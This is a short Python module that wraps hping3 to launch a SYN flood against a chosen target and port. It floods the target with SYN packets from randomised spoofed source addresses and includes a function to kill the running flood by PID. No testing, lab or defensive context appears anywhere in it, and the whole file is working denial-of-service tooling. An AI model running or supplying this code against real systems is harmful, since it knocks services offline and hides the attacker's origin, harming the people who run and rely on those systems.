from random import randint
from scapy.all import *
import random
from scapy.layers.inet import *
import psutil
import signal

global pid
global isOn
isOn = False

def synFlood(target, port, count, svResult):
	global isOn
	if isOn == True:
		print("SYN Flood was on")
		return -1

	isOn = True
	command = ["sudo", "hping3", "-c", str(count), "-d", "120", "-S", "-w", "64", "-p", str(port), "--flood", "--rand-source", target]
	print(str(command))
	p = subprocess.Popen(
		command,
		stdin=subprocess.PIPE,
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE,
		encoding="utf-8"
	)
	global pid
	pid = p.pid
	print(pid)
	output, r = p.communicate(None)
	print(output)
	return p.returncode

def checkKillSynFlood():
	global isOn
	if not "isOn" in globals():
		return -1
	if not isOn:
		return -1
	if not pid:
		return -1
	if pid != -1:
		if psutil.pid_exists(pid):
			print("killing SYN Flood")
			os.kill(pid, signal.SIGKILL)
			isOn = False
			return 0
	return -1